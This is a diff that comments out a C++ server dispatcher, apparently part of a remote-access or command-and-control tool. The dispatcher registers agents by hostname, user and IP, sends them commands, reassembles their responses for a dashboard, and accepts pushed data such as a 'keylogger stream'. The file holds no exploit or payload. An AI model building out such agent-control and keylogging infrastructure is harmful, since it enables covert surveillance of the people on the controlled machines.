@@ -1,240 +1,244 @@
-#include "server_dispatcher.hpp"
+// #include "server_dispatcher.hpp"
 
-#include <iostream>
-#include <sstream>
-#include <stdexcept>
+// #include <iostream>
+// #include <sstream>
+// #include <stdexcept>
 
-#include "codec/metrics_parser.hpp"
-#include "codec/protocol_helper.hpp"
-#include "codec/protocol_parser.hpp"
-#include "codec/protocol_serializer.hpp"
-#include "logger.hpp"
-#include "socket/i_socket.hpp"
+// #include "codec/metrics_parser.hpp"
+// #include "codec/protocol_helper.hpp"
+// #include "codec/protocol_parser.hpp"
+// #include "codec/protocol_serializer.hpp"
+// #include "logger.hpp"
+// #include "socket/i_socket.hpp"
 
-void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
-  AgentConnection& connection = static_cast<AgentConnection&>(agent);
-  switch (frame.header.type) {
-    case MessageType::REGISTER:
-      onRegister(connection, frame.payload);
-      break;
-    case MessageType::DASHBOARD_REGISTER:
-      onDashboardRegister(connection, frame.payload);
-      break;
-    case MessageType::RESPONSE:
-      onResponse(connection, frame.payload);
-      break;
-    case MessageType::DATA:
-      onData(frame.payload);
-      break;
-    case MessageType::ERROR:
-      onError(frame.payload);
-      break;
-    default:
-      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
-  }
-}
+// void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
+//   AgentConnection& connection = static_cast<AgentConnection&>(agent);
+//   switch (frame.header.type) {
+//     case MessageType::REGISTER:
+//       onRegister(connection, frame.payload);
+//       break;
+//     case MessageType::DASHBOARD_REGISTER:
+//       onDashboardRegister(connection, frame.payload);
+//       break;
+//     case MessageType::RESPONSE:
+//       onResponse(connection, frame.payload);
+//       break;
+//     case MessageType::DATA:
+//       onData(frame.payload);
+//       break;
+//     case MessageType::ERROR:
+//       onError(frame.payload);
+//       break;
+//     default:
+//       sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
+//   }
+// }
 
-// ── Incoming handlers ────────────────────────────────────────
+// // ── Incoming handlers ────────────────────────────────────────
 
-// The first message from the agent must always be REGISTER.
-// Once we know who it is, we kick off the command sequence.
-void ServerDispatcher::onRegister(AgentConnection& agent,
-                                  const std::vector<std::uint8_t>& payload) {
-  OsInfoPayload agentInfo = ProtocolParser::parseOsInfoPayload(payload);
-  agent.setAgentInfo(agentInfo);
-  agent.setId(agentInfo.hostname);
-  sessionManager_.recordAgentTarget(agent.getFd(), agent.getId());
+// // The first message from the agent must always be REGISTER.
+// // Once we know who it is, we kick off the command sequence.
+// void ServerDispatcher::onRegister(AgentConnection& agent,
+//                                   const std::vector<std::uint8_t>& payload) {
+//   OsInfoPayload agentInfo = ProtocolParser::parseOsInfoPayload(payload);
+//   agent.setAgentInfo(agentInfo);
+//   agent.setIsRegisered();
+//   agent.setId(agentInfo.hostname + ":" + agentInfo.ip);
 
-  std::ostringstream what;
-  what << "[REGISTER] \nhostname : " << agentInfo.hostname
-       << "\nuser : " << agentInfo.current_user
-       << "\nos : " << static_cast<int>(agentInfo.os_type)
-       << "\narch : " << static_cast<int>(agentInfo.arch)
-       << "\nversion : " << agentInfo.os_version << "\nip : " << agentInfo.ip;
-  Logger::info("server dispatcher", what.str());
+//   std::ostringstream what;
+//   what << "[REGISTER] \nhostname : " << agentInfo.hostname
+//        << "\nuser : " << agentInfo.current_user
+//        << "\nos : " << static_cast<int>(agentInfo.os_type)
+//        << "\narch : " << static_cast<int>(agentInfo.arch)
+//        << "\nversion : " << agentInfo.os_version << "\nip : " << agentInfo.ip;
+//   Logger::info("server dispatcher", what.str());
 
-  DataPayload registration;
-  registration.subtype = DataType::REGISTRATION;
-  registration.data = ProtocolSerializer::serializeOsInfoPayload(agentInfo);
-  std::vector<std::uint8_t> registerPayload =
-      ProtocolSerializer::serializeDataPayload(registration);
-  Frame frame{ProtocolHelper::createHeader(MessageType::DATA, payload),
-              payload};
-              
-  if (sessionManager_.isDashboard()) {
-    sessionManager_.getDashboard().sendFrame(frame);
-  }
-}
+//   DataPayload registration;
+//   registration.subtype = DataType::REGISTRATION;
+//   registration.data = ProtocolSerializer::serializeOsInfoPayload(agentInfo);
+//   std::vector<std::uint8_t> registerPayload =
+//       ProtocolSerializer::serializeDataPayload(registration);
+//   Frame frame{ProtocolHelper::createHeader(MessageType::DATA, registerPayload),
+//               registerPayload};
 
-void ServerDispatcher::onDashboardRegister(
-    AgentConnection& dashboard, const std::vector<std::uint8_t>& payload) {
-  OsInfoPayload dashboardInfo = ProtocolParser::parseOsInfoPayload(payload);
-  dashboard.setAgentInfo(dashboardInfo);
-  dashboard.setId(dashboardInfo.hostname);
-  sessionManager_.setDashboardFd(dashboard.getFd());
-  DataPayload agentsList;
-  agentsList.subtype = DataType::AGENTS;
-  std::vector<std::uint8_t> dataPayload;
+//   if (sessionManager_.isDashboard()) {
+//     sessionManager_.getDashboard().sendFrame(frame);
+//   }
+// }
 
-  for (const auto& entry : sessionManager_.getAgents()) {
-    const AgentConnection& agent = entry.second;
-    RegisterPayload registration;
-    // registration.id = agent.getId();
-    registration.system = agent.getAgentInfo();
+// void ServerDispatcher::onDashboardRegister(
+//     AgentConnection& dashboard, const std::vector<std::uint8_t>& payload) {
+//   OsInfoPayload dashboardInfo = ProtocolParser::parseOsInfoPayload(payload);
+//   dashboard.setAgentInfo(dashboardInfo);
+//   dashboard.setIsRegisered();
+//   dashboard.setId(dashboardInfo.hostname + ":" + dashboardInfo.ip);
+//   sessionManager_.setDashboardFd(dashboard.getFd());
+//   sessionManager_.recordAgentTarget(dashboard.getFd(), dashboard.getId());
 
-    std::vector<std::uint8_t> registerPayload =
-        ProtocolSerializer::serializeRegisterPayload(registration);
-    dataPayload.insert(dataPayload.end(), registerPayload.begin(),
-                   registerPayload.end());
-  }
+//   Logger::info("server dispatcher",
+//                "[DASHBOARD REGISTER] : " + dashboard.getId());
+//   DataPayload agentsList;
+//   agentsList.subtype = DataType::AGENTS;
+//   std::vector<std::uint8_t> dataPayload;
 
-  agentsList.data = payload;
+//   for (const auto& entry : sessionManager_.getAgents()) {
+//     const AgentConnection& agent = entry.second;
+//     RegisterPayload registration;
+//     // registration.id = agent.getId();
+//     registration.system = agent.getAgentInfo();
 
-  Frame frame{ProtocolHelper::createHeader(MessageType::DATA, payload),
-              payload};
-  if (sessionManager_.isDashboard()) {
-    sessionManager_.getDashboard().sendFrame(frame);
-  }
+//     std::vector<std::uint8_t> registerPayload =
+//         ProtocolSerializer::serializeRegisterPayload(registration);
+//     dataPayload.insert(dataPayload.end(), registerPayload.begin(),
+//                        registerPayload.end());
+//   }
 
-}
+//   agentsList.data = dataPayload;
+//   std::vector<std::uint8_t> finalPayload =
+//       ProtocolSerializer::serializeDataPayload(agentsList);
 
-// A RESPONSE carries the same id as the COMMAND it answers,
-// plus chunk metadata for large payloads split across messages.
-void ServerDispatcher::onResponse(AgentConnection& agent,
-                                  const std::vector<std::uint8_t>& payload) {
-  std::ostringstream what;
-  what << "Response from agent :" << agent.getAgentInfo().ip << "\n";
-  Logger::info("server dispatcher", what.str());
+//   Frame frame{ProtocolHelper::createHeader(MessageType::DATA, finalPayload),
+//               finalPayload};
+//   dashboard.sendFrame(frame);
+// }
 
-  const ResponsePayload response =
-      ProtocolParser::parseResponsePayload(payload);
+// // A RESPONSE carries the same id as the COMMAND it answers,
+// // plus chunk metadata for large payloads split across messages.
+// void ServerDispatcher::onResponse(AgentConnection& agent,
+//                                   const std::vector<std::uint8_t>& payload) {
+//   std::ostringstream what;
+//   what << "Response from agent :" << agent.getAgentInfo().ip << "\n";
+//   Logger::info("server dispatcher", what.str());
 
-  if (response.total_chunks == 1) {
-    processCompleteResponse(agent, response);
-    return;
-  }
+//   const ResponsePayload response =
+//       ProtocolParser::parseResponsePayload(payload);
 
-  createResponseEntry(response);
+//   if (response.total_chunks == 1) {
+//     processCompleteResponse(agent, response);
+//     return;
+//   }
 
-  IncompleteResponse& incomplete = pendingResponses_[response.id];
-  incomplete.data.insert(incomplete.data.end(), response.data.begin(),
-                         response.data.end());
-  tryCompleteResponse(agent, response);
-}
+//   createResponseEntry(response);
 
-// DATA messages are pushed by the agent without a prior COMMAND
-// (e.g. keylogger stream). Handle them independently of the
-// request/response cycle.
-void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
-  const DataPayload data = ProtocolParser::parseDataPayload(payload);
-  std::ostringstream what;
-  what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
-  if (data.subtype == DataType::METRICS_SAMPLE) {
-    MetricsSample sample = MetricsParser::parseMetricsSample(data.data);
+//   IncompleteResponse& incomplete = pendingResponses_[response.id];
+//   incomplete.data.insert(incomplete.data.end(), response.data.begin(),
+//                          response.data.end());
+//   tryCompleteResponse(agent, response);
+// }
 
-    what << "[DATA] METRICS_SAMPLE\n";
+// // DATA messages are pushed by the agent without a prior COMMAND
+// // (e.g. keylogger stream). Handle them independently of the
+// // request/response cycle.
+// void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
+//   const DataPayload data = ProtocolParser::parseDataPayload(payload);
+//   std::ostringstream what;
+//   what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
+//   if (data.subtype == DataType::METRICS_SAMPLE) {
+//     MetricsSample sample = MetricsParser::parseMetricsSample(data.data);
 
-    what << "CPU: " << sample.cpu.total_percent << "%\n";
-    what << "CPU cores: ";
-    for (float core : sample.cpu.per_core) what << core << "% ";
-    what << '\n';
+//     what << "[DATA] METRICS_SAMPLE\n";
 
-    what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
-         << " bytes used\n";
+//     what << "CPU: " << sample.cpu.total_percent << "%\n";
+//     what << "CPU cores: ";
+//     for (float core : sample.cpu.per_core) what << core << "% ";
+//     what << '\n';
 
-    for (const auto& disk : sample.disks) {
-      what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
-           << " W=" << disk.write_bytes_per_sec << '\n';
-    }
+//     what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
+//          << " bytes used\n";
 
-    for (const auto& iface : sample.interfaces) {
-      what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
-           << " TX=" << iface.tx_bytes_per_sec << '\n';
-    }
-  }
-  Logger::info("server dispatcher", what.str());
-}
+//     for (const auto& disk : sample.disks) {
+//       what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
+//            << " W=" << disk.write_bytes_per_sec << '\n';
+//     }
 
-// ── Outgoing senders ─────────────────────────────────────────
+//     for (const auto& iface : sample.interfaces) {
+//       what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
+//            << " TX=" << iface.tx_bytes_per_sec << '\n';
+//     }
+//   }
+//   Logger::info("server dispatcher", what.str());
+// }
 
-void ServerDispatcher::sendCommand(AgentConnection& agent, CommandType type,
-                                   const std::string& data) {
-  CommandPayload command;
-  command.id = nextId();
-  command.type = type;
-  command.data = data;
-  const std::vector<std::uint8_t> payload =
-      ProtocolSerializer::serializeCommandPayload(command);
+// // ── Outgoing senders ─────────────────────────────────────────
 
-  Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
-                 payload};
-  agent.sendFrame(frame);
-  std::ostringstream what;
-  what << "[COMMAND] id=" << command.id
-       << "  type=" << static_cast<int>(command.type);
-  Logger::info("server dispatcher", what.str());
-}
+// void ServerDispatcher::sendCommand(AgentConnection& agent, CommandType type,
+//                                    const std::string& data) {
+//   CommandPayload command;
+//   command.id = nextId();
+//   command.type = type;
+//   command.data = data;
+//   const std::vector<std::uint8_t> payload =
+//       ProtocolSerializer::serializeCommandPayload(command);
 
-void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
-  const std::vector<uint8_t> payload{};
-  Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
-                 payload};
+//   Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
+//                  payload};
+//   agent.sendFrame(frame);
+//   std::ostringstream what;
+//   what << "[COMMAND] id=" << command.id
+//        << "  type=" << static_cast<int>(command.type);
+//   Logger::info("server dispatcher", what.str());
+// }
 
-  agent.sendFrame(frame);
-  Logger::info("server dispatcher", "[DISCONNECT]");
-}
+// void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
+//   const std::vector<uint8_t> payload{};
+//   Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
+//                  payload};
 
-std::uint32_t ServerDispatcher::nextId() { return nextCmdId_++; }
+//   agent.sendFrame(frame);
+//   Logger::info("server dispatcher", "[DISCONNECT]");
+// }
 
-void ServerDispatcher::createResponseEntry(const ResponsePayload& response) {
-  if (pendingResponses_.find(response.id) == pendingResponses_.end()) {
-    IncompleteResponse incomplete;
-    incomplete.baseResponse = response;
-    pendingResponses_[response.id] = incomplete;
-  }
-}
+// std::uint32_t ServerDispatcher::nextId() { return nextCmdId_++; }
 
-void ServerDispatcher::processCompleteResponse(
-    AgentConnection& agent, const ResponsePayload& response) {
-  std::ostringstream what;
-  what << "[RESPONSE] id=" << response.id
-       << " status=" << static_cast<int>(response.status) << "\n"
-       << ProtocolParser::toString(response.data);
-  Logger::info("server dispatcher", what.str());
+// void ServerDispatcher::createResponseEntry(const ResponsePayload& response) {
+//   if (pendingResponses_.find(response.id) == pendingResponses_.end()) {
+//     IncompleteResponse incomplete;
+//     incomplete.baseResponse = response;
+//     pendingResponses_[response.id] = incomplete;
+//   }
+// }
 
-  // AgentConnection dashboard = sessionManager_.getDashboard();
-  DashboardResponse finalResponse;
-  finalResponse.target = agent.getId();
-  finalResponse.response = response;
-  std::vector<std::uint8_t> payload =
-      ProtocolSerializer::serializeDashboardResponse(finalResponse);
-  Frame frame = {ProtocolHelper::createHeader(MessageType::RESPONSE, payload),
-                 payload};
+// void ServerDispatcher::processCompleteResponse(
+//     AgentConnection& agent, const ResponsePayload& response) {
+//   std::ostringstream what;
+//   what << "[RESPONSE] id=" << response.id
+//        << " status=" << static_cast<int>(response.status) << "\n"
+//        << ProtocolParser::toString(response.data);
+//   Logger::info("server dispatcher", what.str());
 
-  if (sessionManager_.isDashboard()) {
-    sessionManager_.getDashboard().sendFrame(frame);
-  }
+//   // AgentConnection dashboard = sessionManager_.getDashboard();
+//   DashboardResponse finalResponse;
+//   finalResponse.target = agent.getId();
+//   finalResponse.response = response;
+//   std::vector<std::uint8_t> payload =
+//       ProtocolSerializer::serializeDashboardResponse(finalResponse);
+//   Frame frame = {ProtocolHelper::createHeader(MessageType::RESPONSE, payload),
+//                  payload};
 
-  if (pendingResponses_.find(response.id) != pendingResponses_.end()) {
-    pendingResponses_.erase(response.id);
-  }
-}
+//   if (sessionManager_.isDashboard()) {
+//     sessionManager_.getDashboard().sendFrame(frame);
+//   }
 
-void ServerDispatcher::tryCompleteResponse(AgentConnection& agent,
-                                           const ResponsePayload& response) {
-  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
-  if (lastChunk) {
-    IncompleteResponse& incomplete = pendingResponses_[response.id];
+//   if (pendingResponses_.find(response.id) != pendingResponses_.end()) {
+//     pendingResponses_.erase(response.id);
+//   }
+// }
 
-    // if (incomplete.chunksReceived != response.total_chunks) {
-    //   throw std::runtime_error("Missing chunks for response id " +
-    //                            std::to_string(response.id));
-    // }
+// void ServerDispatcher::tryCompleteResponse(AgentConnection& agent,
+//                                            const ResponsePayload& response) {
+//   const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
+//   if (lastChunk) {
+//     IncompleteResponse& incomplete = pendingResponses_[response.id];
 
-    // Reassemble all chunks
-    ResponsePayload complete = incomplete.baseResponse;
-    complete.data = incomplete.data;
+//     // if (incomplete.chunksReceived != response.total_chunks) {
+//     //   throw std::runtime_error("Missing chunks for response id " +
+//     //                            std::to_string(response.id));
+//     // }
 
-    processCompleteResponse(agent, complete);
-  }
-}
+//     // Reassemble all chunks
+//     ResponsePayload complete = incomplete.baseResponse;
+//     complete.data = incomplete.data;
+
+//     processCompleteResponse(agent, complete);
+//   }
+// }
